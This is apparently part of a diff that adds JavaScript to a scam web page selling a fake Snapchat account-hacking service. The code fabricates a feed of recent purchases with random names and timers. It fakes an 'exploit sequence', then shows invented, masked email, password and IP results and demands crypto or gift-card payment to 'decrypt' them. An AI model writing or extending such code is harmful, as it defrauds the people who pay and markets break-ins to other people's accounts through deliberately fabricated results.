+        function formatTimeAgo(ts) {
+            const seconds = Math.floor((Date.now() - ts) / 1000);
+            if (seconds < 60) return "just now";
+            if (seconds < 120) return "1 min ago";
+            const minutes = Math.floor(seconds / 60);
+            if (minutes < 60) return `${minutes} mins ago`;
+            const hours = Math.floor(minutes / 60);
+            if (hours < 24) return `${hours} hours ago`;
+            const days = Math.floor(hours / 24);
+            if (days === 1) return "1 day ago";
+            return `${days} days ago`;
+        }
+        
+        function displayPurchases() {
+            const container = document.getElementById('recentPurchases');
+            const history = loadPurchaseHistory().slice(0, 5);
+            if (container) {
+                container.innerHTML = history.map((p, i) => `
+                    <div class="purchase-card ${i === 0 ? 'new-purchase' : ''}">
+                        <div class="d-flex justify-content-between align-items-center">
+                            <div>
+                                <strong style="color: #ffc107;">${p.name}</strong>
+                                <small class="d-block text-muted">${p.emoji} ${p.method}</small>
+                            </div>
+                            <div class="d-flex align-items-center">
+                                <span class="text-warning fw-bold">${p.amount}</span>
+                                <span class="purchase-type ${p.type}">${p.type === 'unlimited' ? 'UNLIMITED' : 'SINGLE'}</span>
+                                <span class="payment-method ${p.paymentType} ms-1">${p.paymentType === 'crypto' ? 'CRYPTO' : 'GIFT'}</span>
+                            </div>
+                        </div>
+                        <small class="time-text text-muted">${formatTimeAgo(p.timestamp)}</small>
+                    </div>
+                `).join('');
+            }
+        }
+        
+        function addRandomPurchase() {
+            const history = loadPurchaseHistory();
+            const methodIndex = Math.floor(Math.random() * purchaseMethods.length);
+            history.unshift({
+                name: generateRandomUsername(),
+                method: purchaseMethods[methodIndex].method,
+                amount: purchaseMethods[methodIndex].amount,
+                emoji: purchaseMethods[methodIndex].emoji,
+                type: purchaseMethods[methodIndex].type,
+                paymentType: purchaseMethods[methodIndex].paymentType,
+                timestamp: Date.now()
+            });
+            if (history.length > 50) history.pop();
+            localStorage.setItem('purchaseHistory', JSON.stringify(history));
+            displayPurchases();
+            
+            const nextDelay = 600000 + Math.floor(Math.random() * 2400000);
+            setTimeout(addRandomPurchase, nextDelay);
+        }
+        
+        function showNSFWImage(el) { el.style.display = 'none'; }
+        
+        // Hack submission - NOW WITH CONSISTENT RESULTS (GMAIL & OUTLOOK ONLY)
+        document.getElementById('hackForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value.trim();
+            if (!username) { alert('Enter a valid Snapchat username'); return; }
+            
+            const startBtn = document.getElementById('startHackBtn');
+            startBtn.disabled = true;
+            startBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>EXPLOIT IN PROGRESS...';
+            
+            document.getElementById('loading').classList.remove('d-none');
+            document.getElementById('result').classList.add('d-none');
+            document.getElementById('terminalResults').classList.add('d-none');
+            document.getElementById('avatarContainer').innerHTML = '';
+            
+            try {
+                document.getElementById('accountFound').classList.remove('d-none');
+                document.getElementById('targetUsername').textContent = username;
+                document.getElementById('resultUsername').textContent = username;
+                
+                const avatarUrl = await fetchSnapchatAvatar(username);
+                const avatarImg = document.createElement('img');
+                avatarImg.src = avatarUrl;
+                avatarImg.alt = username;
+                avatarImg.className = 'snap-avatar';
+                document.getElementById('avatarContainer').appendChild(avatarImg);
+                
+                await advancedHackSimulation(username);
+                
+                // Get consistent results for this username (always the same for the same username)
+                const consistentData = getStoredResults(username);
+                
+                sessionStorage.setItem('lastHackResults', JSON.stringify(consistentData));
+                sessionStorage.setItem('lastHackUsername', username);
+                
+                // Display masked results
+                document.getElementById('resultEmail').textContent = maskEmail(consistentData.email);
+                document.getElementById('resultPassword').textContent = maskPassword();
+                document.getElementById('resultMEC').textContent = maskMEC();
+                document.getElementById('resultIP').textContent = maskIP(consistentData.ip);
+                
+                document.getElementById('loading').classList.add('d-none');
+                document.getElementById('terminalResults').classList.remove('d-none');
+                document.getElementById('result').classList.remove('d-none');
+                document.getElementById('resultMessage').textContent = `⚠️ DATA ENCRYPTED — Purchase credits to decrypt ${username}'s credentials`;
+                
+            } catch (error) {
+                document.getElementById('loading').classList.add('d-none');
+                document.getElementById('result').classList.remove('d-none');
+                document.getElementById('avatarContainer').innerHTML = `<div class="alert alert-danger">Exploit failed. Target may be protected.</div>`;
+            } finally {
+                startBtn.disabled = false;
+                startBtn.innerHTML = '<i class="fas fa-skull me-2"></i>INITIATE EXPLOIT SEQUENCE';
+            }
+        });
+        
+        function showPaymentSelection(price) {
+            const encodedPrice = btoa(price.toString());
+            window.location.href = `payment-select.html?price=${encodedPrice}`;
+        }
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            displayPurchases();
+            const initialDelay = 600000 + Math.floor(Math.random() * 2400000);
+            setTimeout(addRandomPurchase, initialDelay);
+            
+            document.getElementById('seeAllReviews')?.addEventListener('click', function() {
+                const reviewsModal = new bootstrap.Modal(document.getElementById('reviewsModal'));
+                if (window.innerWidth <= 768) document.getElementById('reviewsModal').querySelector('.modal-dialog').classList.add('modal-fullscreen-sm-down');
+                reviewsModal.show();
+            });
+        });
+    </script>
+</body>
+
+</html>
